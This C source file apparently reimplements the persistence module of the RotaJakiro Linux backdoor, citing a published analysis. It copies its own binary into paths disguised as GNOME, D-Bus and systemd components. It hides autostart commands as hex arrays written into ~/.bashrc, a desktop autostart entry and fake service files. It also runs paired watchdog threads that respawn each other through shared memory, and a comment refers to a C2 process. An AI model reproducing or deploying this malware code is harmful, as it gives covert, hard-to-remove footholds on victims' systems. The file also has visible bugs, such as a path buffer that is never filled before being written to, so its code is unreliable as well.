#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/shm.h>
#include <sys/wait.h>
#include <pthread.h>
#include <limits.h>

// custom headers
#include "persistence.h"
#include "utils.h"


bool copy_rota_to_userland(char *destpath) {
    struct stat procstru;
    int fsize;

    // allocating file size to copy data to destination buffer.
    stat("/proc/self/exe", &procstru);
    fsize = procstru.st_size;
    char *exe = (char *)malloc(fsize);
    memset(exe, 0, fsize);

    // copy data from /proc/self/exe into exe buffer.
    int fd  = open("/proc/self/exe", O_RDONLY);
    read(fd, exe, fsize);
    close(fd);

    // write binary to new location specified by destpath
    int fout  = open(destpath, O_CREAT|O_WRONLY, 0755);
    int bytesWritten = write(fout, exe, fsize);
    free(exe);

    close(fout);
    // if bytes written == size of file
    if (bytesWritten == fsize) {
        return true;
    }

    return false;
}


bool nonroot_bashrc_persistence() {
    /**
    *
    * source: https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/
    *
    * # Add GNOME's helper designed to work with the I/O abstraction of GIO
    * # this environment variable is set, gvfsd will not start the fuse filesystem
    * if [ -d ${HOME} ]; then
    *     ${HOME}/.gvfsd/.profile/gvfsd-helper
    * fi
    *
    * */

    char bashrc_autostart [219] = {0x23,0x20,0x41,0x64,0x64,0x20,0x47,0x4e,0x4f,0x4d,0x45,0x27,0x73,0x20,0x68,0x65,0x6c,0x70,0x65,0x72,0x20,0x64,0x65,0x73,0x69,0x67,0x6e,0x65,0x64,0x20,0x74,0x6f,0x20,0x77,0x6f,0x72,0x6b,0x20,0x77,0x69,0x74,0x68,0x20,0x74,0x68,0x65,0x20,0x49,0x2f,0x4f,0x20,0x61,0x62,0x73,0x74,0x72,0x61,0x63,0x74,0x69,0x6f,0x6e,0x20,0x6f,0x66,0x20,0x47,0x49,0x4f,0xa,0x23,0x20,0x74,0x68,0x69,0x73,0x20,0x65,0x6e,0x76,0x69,0x72,0x6f,0x6e,0x6d,0x65,0x6e,0x74,0x20,0x76,0x61,0x72,0x69,0x61,0x62,0x6c,0x65,0x20,0x69,0x73,0x20,0x73,0x65,0x74,0x2c,0x20,0x67,0x76,0x66,0x73,0x64,0x20,0x77,0x69,0x6c,0x6c,0x20,0x6e,0x6f,0x74,0x20,0x73,0x74,0x61,0x72,0x74,0x20,0x74,0x68,0x65,0x20,0x66,0x75,0x73,0x65,0x20,0x66,0x69,0x6c,0x65,0x73,0x79,0x73,0x74,0x65,0x6d,0xa,0x69,0x66,0x20,0x5b,0x20,0x2d,0x64,0x20,0x24,0x7b,0x48,0x4f,0x4d,0x45,0x7d,0x20,0x5d,0x3b,0x20,0x74,0x68,0x65,0x6e,0xa,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x24,0x7b,0x48,0x4f,0x4d,0x45,0x7d,0x2f,0x2e,0x67,0x76,0x66,0x73,0x64,0x2f,0x2e,0x70,0x72,0x6f,0x66,0x69,0x6c,0x65,0x2f,0x67,0x76,0x66,0x73,0x64,0x2d,0x68,0x65,0x6c,0x70,0x65,0x72,0xa,0x66,0x69,0xa};

    char *HOME = getenv("HOME");
    char *bashrc = "/.bashrc";
    int bytes_written;

    int fpath_size = strlen(HOME) + strlen(bashrc);
    char *fpath = (char *)malloc(fpath_size);
    memset(fpath, 0, fpath_size);
    strncat(fpath, HOME, strlen(HOME));
    strncat(fpath, bashrc, strlen(bashrc));

    int fd = open(fpath, O_CREAT| O_WRONLY| O_APPEND , 0755);
    if (fd < 0) {
        return false;
    }

    bytes_written = write(fd, bashrc_autostart, strlen(bashrc_autostart));
    if (bytes_written < 0) {
        #ifdef DEBUG
        fprintf(stderr, "\n[nonroot_bashrc_persistence]Error writing to bashrc: %s", strerror(errno));
        #endif
    }

    close(fd);
    free(fpath);

    // bytes written == size of data to be written
    if (bytes_written == strlen(bashrc_autostart)) {
        return true;
    }
    return false;
}

bool nonroot_desktop_persistence() {
    /*
    * source: https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/
    * gnomehelper_desktop contains the following value:
    *
    * [Desktop Entry]
    * Type=Application
    * Exec=$HOME/.gvfsd/.profile/gvfsd-helper
    */
    char gnomehelper_desktop [73] = {0x5b,0x44,0x65,0x73,0x6b,0x74,0x6f,0x70,0x20,0x45,0x6e,0x74,0x72,0x79,0x5d,0xa,0x54,0x79,0x70,0x65,0x3d,0x41,0x70,0x70,0x6c,0x69,0x63,0x61,0x74,0x69,0x6f,0x6e,0xa,0x45,0x78,0x65,0x63,0x3d,0x24,0x48,0x4f,0x4d,0x45,0x2f,0x2e,0x67,0x76,0x66,0x73,0x64,0x2f,0x2e,0x70,0x72,0x6f,0x66,0x69,0x6c,0x65,0x2f,0x67,0x76,0x66,0x73,0x64,0x2d,0x68,0x65,0x6c,0x70,0x65,0x72,0xa};


    char *HOME = getenv("HOME");
    char *gnomehelper_path = "/.config/au-tostart/gnomehelper.desktop";

    int fpath_size = strlen(HOME) + strlen(gnomehelper_path);
    char *fpath = (char *)malloc(PATH_MAX);
    memset(fpath, 0, PATH_MAX);
    strncat(fpath, HOME, strlen(HOME));
    strncat(fpath, gnomehelper_path, strlen(gnomehelper_path));

    // create dir in home directory
    char *audir = "/.config/au-tostart";
    int dirpath_size = strlen(HOME) + strlen(audir);
    char *dirpath = (char *)malloc(PATH_MAX);
    memset(dirpath, 0, PATH_MAX);

    strncat(dirpath, HOME, strlen(HOME));
    strncat(dirpath, audir, strlen(audir));
    if (access(dirpath, F_OK) == -1) {
        mkdir(dirpath, 0755);
    }

    bool result = write_to_file(fpath, gnomehelper_desktop);

    // -------- copy userland binary now -------------
    //
    // copy rota binary to /home/$USER/.fvfsd/.profile/gvfsd-helper

    char *gvfsd_helper= "/.gvfsd/.profile/gvfsd-helper";
    fpath_size = strlen(HOME) + strlen(gvfsd_helper);
    char *binpath = (char *)malloc(fpath_size);
    memset(binpath, 0, fpath_size);
    strncat(binpath, HOME, strlen(HOME));
    strncat(binpath, gvfsd_helper, strlen(gvfsd_helper));

    // build string for userland file location.
    //char *gvfsd_profile= "/.gvfsd/.profile";
    char *gvfsd_profile= "/.gvfsd";
    dirpath_size = strlen(HOME) + strlen(gvfsd_profile);
    char *dirpath_profile = (char *)malloc(dirpath_size);
    memset(dirpath_profile, 0, dirpath_size);

    strncat(dirpath_profile, HOME, strlen(HOME));
    strncat(dirpath_profile, gvfsd_profile, strlen(gvfsd_profile));
    // if directory does not exist create it.
    if (access(dirpath_profile, F_OK) == -1) {
        int res = mkdir(dirpath_profile, 0755);
        if (res != 0) {
            #ifdef DEBUG
            fprintf(stderr, "\n[gvfsd]Error creating directory to %s.\tError: %s",
                dirpath_profile, strerror(errno));
            #endif
        }

    }

    // creaking .profile within gvfsd
    char *profile_dir = "/.gvfsd/.profile";
    dirpath_size = strlen(HOME) + strlen(profile_dir);
    char *profilepath_profile = (char *)malloc(dirpath_size);
    memset(profilepath_profile, 0, dirpath_size);
    strncat(profilepath_profile, HOME, strlen(HOME));
    strncat(profilepath_profile, profile_dir, strlen(profile_dir));
    // if directory does not exist create it.
    if (access(profilepath_profile, F_OK) == -1) {
        int res = mkdir(profilepath_profile, 0755);
        if (res != 0) {
            #ifdef DEBUG
            fprintf(stderr, "\n[gvfsd/profile] Error creating directory to %s\tError: %s",
                dirpath_profile, strerror(errno));
            #endif
        }
    }

    // write rota binary to /home/$USER/.gvfsd/.profile/gvfsd.
    bool rota_write_gvfsd = copy_rota_to_userland(binpath);

    if (rota_write_gvfsd == false) {
        #ifdef DEBUG
        fprintf(stderr, "\n[rota] Error writing rota to %s.\tError : %s",
                binpath, strerror(errno));
        #endif
    }

    // -------- copy userland binary now -------------
    //
    // copy rota binary to /home/$USER/.dbus/sessions/session-dbus

    char *session_dbus= "/.dbus/sessions/session-dbus";
    fpath_size = strlen(HOME) + strlen(session_dbus);
    char *binpath_session_dbus = (char *)malloc(fpath_size);
    memset(binpath_session_dbus, 0, fpath_size);

    strncat(binpath_session_dbus, HOME, strlen(HOME));
    strncat(binpath_session_dbus, session_dbus, strlen(session_dbus));

    char *dbus_dir = "/.dbus";
    dirpath_size = strlen(HOME) + strlen(dbus_dir);
    char *dbus_path = (char *)malloc(dirpath_size);
    memset(dbus_path, 0, dirpath_size);

    strncat(dbus_path, HOME, strlen(HOME));
    strncat(dbus_path, dbus_dir, strlen(dbus_dir));

    // if directory does not exist create it.
    if (access(dbus_dir, F_OK) == -1) {
        int res = mkdir(dbus_path, 0755);
        if (res != 0) {
            #ifdef DEBUG
            fprintf(stderr, "\n[sessions/session-dbus] Error creating directory to %s\tError: %s\n",
                dirpath_profile, strerror(errno));
            #endif
        }
    }

    char *dbus_sessions_dir = "/.dbus/sessions";
    dirpath_size = strlen(HOME) + strlen(dbus_sessions_dir);
    char *dbus_session_path = (char *)malloc(dirpath_size);
    memset(dbus_session_path, 0, dirpath_size);

    strncat(dbus_session_path, HOME, strlen(HOME));
    strncat(dbus_session_path, dbus_sessions_dir, strlen(dbus_sessions_dir));

    // if directory does not exist create it.
    if (access(dbus_session_path, F_OK) == -1) {
        int res = mkdir(dbus_session_path, 0755);
        if (res != 0) {
            #ifdef DEBUG
            fprintf(stderr, "\n[sessions/session-dbus] Error creating directory to %s\tError: %s\n",
                dirpath_profile, strerror(errno));
            #endif
        }
    }

    // write rota binary to /home/$USER/.dbus/sessions/session-dbus
    bool rota_write_session_dbus = copy_rota_to_userland(binpath_session_dbus);

    if (rota_write_session_dbus == false) {
        #ifdef DEBUG
        fprintf(stderr, "\n[rota]Error writing rota to %s.\tError : %s",
                binpath, strerror(errno));
        #endif
    }

    free(fpath);
    free(binpath);
    return result;
}

bool nonroot_persistence(void) {
    // handy wraper funtion for non-root persistence.

    char *home = getenv("HOME");
    char *desktop_path = "/.config/au-tostart/gnomehelper.desktop";

    char *home_desktop_path = (char *)malloc(PATH_MAX);
		memset(home_desktop_path, 0, PATH_MAX);
    memcpy(home_desktop_path, home, strlen(home));
    strncat(home_desktop_path, desktop_path, strlen(desktop_path));

    if (access(home_desktop_path, F_OK) != 0) {
        nonroot_desktop_persistence();
        nonroot_bashrc_persistence();
    }

    free(home_desktop_path);
    return true;
}


bool root_persistence(void) {

    bool result;
    char *fpath;

    char *init_path_1 = "/etc/init/systemd-agent.conf";
    char *systemd_path_1 = "/lib/systemd/system/sys-temd-agent.service";

    if (access("/run/systemd/system", F_OK)) { //systemd
        /*
        **
        * source: https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/
        *
        * Content of systemd-agent.conf
        * -----------------------------
        * #system-daemon - configure for system daemon
        * #This service causes system have an associated
        * #kernel object to be started on boot.
        * description "system daemon"
        * start on filesystem or runlevel [2345]
        * exec /bin/systemd/systemd-daemon
        * respawn
        */
        char systemd_agent_conf [238] = {0x23,0x73,0x79,0x73,0x74,0x65,0x6d,0x2d,0x64,0x61,0x65,0x6d,0x6f,0x6e,0x20,0x2d,0x20,0x63,0x6f,0x6e,0x66,0x69,0x67,0x75,0x72,0x65,0x20,0x66,0x6f,0x72,0x20,0x73,0x79,0x73,0x74,0x65,0x6d,0x20,0x64,0x61,0x65,0x6d,0x6f,0x6e,0xa,0x23,0x54,0x68,0x69,0x73,0x20,0x73,0x65,0x72,0x76,0x69,0x63,0x65,0x20,0x63,0x61,0x75,0x73,0x65,0x73,0x20,0x73,0x79,0x73,0x74,0x65,0x6d,0x20,0x68,0x61,0x76,0x65,0x20,0x61,0x6e,0x20,0x61,0x73,0x73,0x6f,0x63,0x69,0x61,0x74,0x65,0x64,0xa,0x23,0x6b,0x65,0x72,0x6e,0x65,0x6c,0x20,0x6f,0x62,0x6a,0x65,0x63,0x74,0x20,0x74,0x6f,0x20,0x62,0x65,0x20,0x73,0x74,0x61,0x72,0x74,0x65,0x64,0x20,0x6f,0x6e,0x20,0x62,0x6f,0x6f,0x74,0x2e,0xa,0x64,0x65,0x73,0x63,0x72,0x69,0x70,0x74,0x69,0x6f,0x6e,0x20,0x22,0x73,0x79,0x73,0x74,0x65,0x6d,0x20,0x64,0x61,0x65,0x6d,0x6f,0x6e,0x22,0xa,0x73,0x74,0x61,0x72,0x74,0x20,0x6f,0x6e,0x20,0x66,0x69,0x6c,0x65,0x73,0x79,0x73,0x74,0x65,0x6d,0x20,0x6f,0x72,0x20,0x72,0x75,0x6e,0x6c,0x65,0x76,0x65,0x6c,0x20,0x5b,0x32,0x33,0x34,0x35,0x5d,0xa,0x65,0x78,0x65,0x63,0x20,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x79,0x73,0x74,0x65,0x6d,0x64,0x2f,0x73,0x79,0x73,0x74,0x65,0x6d,0x64,0x2d,0x64,0x61,0x65,0x6d,0x6f,0x6e,0xa,0x72,0x65,0x73,0x70,0x61,0x77,0x6e,0xa};

        int fpath_size = strlen(systemd_path_1);
        fpath = (char *)malloc(fpath_size);
        memset(fpath,0, fpath_size);
        result = write_to_file(fpath, systemd_agent_conf);
        copy_rota_to_userland("/bin/systemd/systemd-daemon");
        free(fpath);

    } else { // non systemd system...
        /**
        *
        * source; https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/
        * Content of systemd-agent.service
        * -----------------------------
        * [Unit]
        * Description=System Daemon
        * Wants=network-online.target
        * After=network-online.target
        * [Service]
        * ExecStart=/usr/lib/systemd/systemd-daemon
        * Restart=always
        * [Install]
        *
        * */
        char sys_temd_agent_service [166] = {0x5b,0x55,0x6e,0x69,0x74,0x5d,0xa,0x44,0x65,0x73,0x63,0x72,0x69,0x70,0x74,0x69,0x6f,0x6e,0x3d,0x53,0x79,0x73,0x74,0x65,0x6d,0x20,0x44,0x61,0x65,0x6d,0x6f,0x6e,0xa,0x57,0x61,0x6e,0x74,0x73,0x3d,0x6e,0x65,0x74,0x77,0x6f,0x72,0x6b,0x2d,0x6f,0x6e,0x6c,0x69,0x6e,0x65,0x2e,0x74,0x61,0x72,0x67,0x65,0x74,0xa,0x41,0x66,0x74,0x65,0x72,0x3d,0x6e,0x65,0x74,0x77,0x6f,0x72,0x6b,0x2d,0x6f,0x6e,0x6c,0x69,0x6e,0x65,0x2e,0x74,0x61,0x72,0x67,0x65,0x74,0xa,0x5b,0x53,0x65,0x72,0x76,0x69,0x63,0x65,0x5d,0xa,0x45,0x78,0x65,0x63,0x53,0x74,0x61,0x72,0x74,0x3d,0x2f,0x75,0x73,0x72,0x2f,0x6c,0x69,0x62,0x2f,0x73,0x79,0x73,0x74,0x65,0x6d,0x64,0x2f,0x73,0x79,0x73,0x74,0x65,0x6d,0x64,0x2d,0x64,0x61,0x65,0x6d,0x6f,0x6e,0xa,0x52,0x65,0x73,0x74,0x61,0x72,0x74,0x3d,0x61,0x6c,0x77,0x61,0x79,0x73,0xa,0x5b,0x69,0x6e,0x73,0x74,0x61,0x6c,0x6c,0x5d,0xa};
        int fpath_size = strlen(init_path_1);
        fpath = (char *)malloc(fpath_size);
        memset(fpath,0, fpath_size);

        result = write_to_file(fpath, sys_temd_agent_service);
        copy_rota_to_userland("/usr/lib/systemd/systemd-daemon");
        free(fpath);
    }

    free(fpath);
    return result;
}


bool monitor_proc(int *pid) {

    char *c_pid = (char *)malloc(sizeof(pid));
    char *procpath = "/proc/";

    int size_procpath = strlen(procpath) + sizeof(pid);
    char *finalpath = (char *)malloc(size_procpath);
    memset(finalpath, 0, size_procpath);

    sprintf(c_pid, "%d", *pid); // convert pid int to char

    strncpy(finalpath, procpath, strlen(procpath));
    strncat(finalpath, c_pid, strlen(c_pid));
    // variable "finalpath" is now /proc/<PID>

    int res = access(finalpath, F_OK);
    free(finalpath);
    free(c_pid);
    if (res == 0 ) {
        return true; // file exists
    } else {
        return false; // file does not exists, respawn program
    }
}

void fork_exec(char *fpath) {

    int wstatus;
    int res = fork();

    if (res < 0) {
        #ifdef DEBUG
        fprintf(stderr, "[fork_exec] error forking : %s",
                strerror(errno));
        #endif
        exit(1);
    } else if (res == 0){
        // child process to execvp;
        execlp(fpath, fpath, NULL);
    } else {
        waitpid(res, &wstatus, 0);
    }
}


void *watchdog_process_shmget() {
    // stop defunct processes from showing up
    signal(SIGCHLD, SIG_IGN);

    // detach from current console, and make systemd the parent
    bool proc_alive;
    int pid = getpid();

    // obtain PID from shared memory
    int shmid = shmget(0x64b2e2, 8, IPC_CREAT | 0666);
    if (shmid < 0) {
        #ifdef DEBUG
        fprintf(stderr, "\n[wathcdog_process_shmget](%d) Error getting shared memory : %s\n",
                getpid(),
                strerror(errno));
        #endif
        sleep(5);
        // recurisvely call watchdog in the event IPC shmem creation fails.
        watchdog_process_shmget();
    }

    // write PID to sharedmem
    int *addr = (int *)shmat(shmid, NULL, 0);
    memcpy(addr, &pid, 4);

    do {

        // get handle to shared mem
        int *shmem_pid_addr = (int *)shmat(shmid, NULL, 0);

        // get "upper bytes" from shmem
        int upper_bytes = *(shmem_pid_addr+4);

        #ifdef DEBUG
        fprintf(stdout,"[watchdog_process_shmget] PID from shared memory is: %d current pid is: %d\n",
                upper_bytes,
                getpid());
        #endif

        //  check /proc/<PID> exists....
        proc_alive = monitor_proc(&upper_bytes);

        //if proc not there, exec into existence
        if (proc_alive == false) {
            #ifdef DEBUG
            fprintf(stderr, "[watchdog_process_shmget](%d) process %d is not alive! spawning\n",
                    getpid(),
                    upper_bytes);
            #endif


            char *user = getenv("HOME");
            char *sessiondbus_helper_path = "/.dbus/sessions/session-dbus";
            int sessiondbus_path_size = strlen(user) + strlen(sessiondbus_helper_path);
            char *user_sessiondbus_helper_path = (char *)malloc(sessiondbus_path_size);
            memset(user_sessiondbus_helper_path, 0, sessiondbus_path_size);

            memcpy(user_sessiondbus_helper_path, user, strlen(user));
            strncat(user_sessiondbus_helper_path, sessiondbus_helper_path, strlen(sessiondbus_helper_path));
            //char* argument_list[] = {"/bin/sh", "-c", "/home/gdev/.dbus/sessions/session-dbus", "&", NULL}; // NULL terminated array of char* strings
            char* argument_list[] = {"/bin/sh", "-c", user_sessiondbus_helper_path, "&", NULL}; // NULL terminated array of char* strings
            int f_pid = fork();
            if (f_pid == 0) {
                execvp("/bin/sh", argument_list);
            }
            close(f_pid);
            free(user_sessiondbus_helper_path);
        }

        sleep(10);
    } while(true);


    // detatch from process
    pthread_detach(pthread_self());
}


void *watchdog_process_shmread() {
    // stop defunct processes from showing up
    signal(SIGCHLD, SIG_IGN);

    // detatch from console, making systemd parent.
    // daemon(0,0);

    bool proc_alive;

    do {
        // session bus runs this function to montior the main C2 process within gvfsd-helper.
        int shmid = shmget(0x64b2e2, 8, 0666);
        if (shmid < 0) {
            #ifdef DEBUG
            fprintf(stderr, "\n[watchdog_process_shmread](%d) %s\n", getpid(), strerror(errno));
            #endif
            sleep(2);
            watchdog_process_shmread();
        }

        sleep(3);
        // get PID to write sharedmem
        int pid = getpid();
        int *addr = shmat(shmid, NULL, 0);

        // check address obtained is valid
        if (*addr == -1) {
            #ifdef DEBUG
            fprintf(stderr, "error accessing memory!");
            #endif
            exit(1);
        }

        memcpy(addr+4, &pid, 4); // copy to "upper half" of 8 bytes:

        #ifdef DEBUG
        fprintf(stdout, "\n[wathcdog_process_shmread] wrote %d to shared memory\n", getpid());
        #endif

        // get pid from shared memory.
        int *shmem_pid_addr = (int *)shmat(shmid, NULL, 0);
        int *tmpPid = (int *)malloc(4);
        memset(tmpPid, 0, 4);
        memcpy(tmpPid, shmem_pid_addr, 4);
        proc_alive = monitor_proc(tmpPid);

        #ifdef DEBUG
        printf("[watchdog_process_shmread] PID obtained from shmem is %d, current pid is %d\n",
               *tmpPid,
               getpid());
        #endif

        //if proc pid entry not there, exec into existence
        if (proc_alive == false) {
            #ifdef DEBUG
            fprintf(stderr, "[shmread] (%d) process id %d is not alive! spawning\n", getpid(), *tmpPid);
            #endif

            char *user = getenv("HOME");
            char *gvfsd_helper_path = "/.gvfsd/.profile/gvfsd-helper";
            int gvfsd_path_size = strlen(user) + strlen(gvfsd_helper_path);
            char *user_gvfsd_helper_path = (char *)malloc(gvfsd_path_size);
            memset(user_gvfsd_helper_path, 0, gvfsd_path_size);

            memcpy(user_gvfsd_helper_path, user, strlen(user));
            strncat(user_gvfsd_helper_path, gvfsd_helper_path, strlen(gvfsd_helper_path));

            //char* argument_list[] = {"/bin/sh", "-c", "/home/gdev/.gvfsd/.profile/gvfsd-helper", "&", NULL}; // NULL terminated array of char* strings
            char* argument_list[] = {"/bin/sh", "-c", user_gvfsd_helper_path, "&", NULL}; // NULL terminated array of char* strings

            int f_pid = fork();
            if (f_pid == 0) {
                execvp("/bin/sh", argument_list);
            }
            close(f_pid);
            free(user_gvfsd_helper_path);
        }

        sleep(6);
    } while(true);

   pthread_detach(pthread_self());
}

void spawn_thread_watchdog(int uid) {
    pthread_t threadid;
    if (uid == 0){
        // the "parent thread" monitors session-dbus
        pthread_create(&threadid, NULL, watchdog_process_shmget, NULL);

    } else {
        // the "child thread" monitors gvfsd-helper
        pthread_create(&threadid, NULL, watchdog_process_shmread, NULL);
    }
}
